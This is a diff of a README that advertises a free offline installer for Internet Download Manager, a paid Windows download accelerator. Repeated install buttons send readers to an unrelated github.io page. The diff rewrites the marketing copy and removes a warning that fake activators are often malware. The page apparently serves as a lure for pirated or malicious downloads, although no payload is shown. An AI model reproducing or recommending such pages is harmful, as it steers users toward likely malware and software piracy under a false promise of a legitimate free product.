@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Download+Manager-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Internet Download Manager Free Installer** — Internet Download Manager (IDM) is the most popular Windows download accelerator, splitting files into segments for significantly faster downloads. Works without internet access, no account required. Full offline installation.
+**💻 Internet Download Manager Free Installer** — Internet Download Manager (IDM) is a Windows download accelerator that increases download speeds by up to 5x using dynamic file segmentation. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Internet Download Manager](https://img.shields.io/badge/⬇_Install_Internet%20Download%20Manager-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Internet Download Manager](https://img.shields.io/badge/⬇_Install_Internet+Download+Manager-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Internet Download Manager
 
-Internet Download Manager (IDM) is the most popular Windows download accelerator, splitting files into segments for significantly faster downloads. It integrates with all major browsers, resumes broken downloads, schedules downloads, and supports batch downloading.
+Internet Download Manager (IDM) is a Windows download accelerator that increases download speeds by up to 5x using dynamic file segmentation. Automatically catches downloads from browsers, resumes interrupted downloads, schedules downloads for off-peak hours, and integrates with all major browsers. IDM's queuing system and batch download capabilities make it essential for downloading large files reliably.
 
 ---
 
 ## ❌ Problem: Internet Download Manager is hard to access
 
-- **Windows Only** — No macOS or Linux version available
-- **Paid License** — Requires purchase; relatively expensive for a download manager
-- **Piracy Issues** — Widely pirated; fake activators common and often malware
-- **Browser Integration** — IDM browser extension occasionally causes conflicts
+- **Windows Only** — No macOS or Linux version
+- **Commercial License** — Requires paid license after trial period
+- **Browser Integration** — Occasional compatibility issues with browser extension updates
+- **UI Design** — Interface design less modern than newer download managers
 
 ---
 
@@ -81,7 +81,7 @@ Internet Download Manager (IDM) is the most popular Windows download accelerator
 
 <div align="center">
 
-[![⬇ Install Internet Download Manager](https://img.shields.io/badge/⬇_Install_Internet%20Download%20Manager-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Internet Download Manager](https://img.shields.io/badge/⬇_Install_Internet+Download+Manager-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Internet Download Manager (IDM) is the most popular Windows download accelerator
 
 ---
 
-**Internet Download Manager Free Installer** — Internet Download Manager (IDM) is the most popular Windows download accelerator, splitting files into segments for significantly faster downloads. Install without internet connection today!
+**Internet Download Manager Free Installer** — Internet Download Manager (IDM) is a Windows download accelerator that increases download speeds by up to 5x using dynamic file segmentation. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Internet Download Manager](https://img.shields.io/badge/⬇_Install_Internet%20Download%20Manager-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Internet Download Manager](https://img.shields.io/badge/⬇_Install_Internet+Download+Manager-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
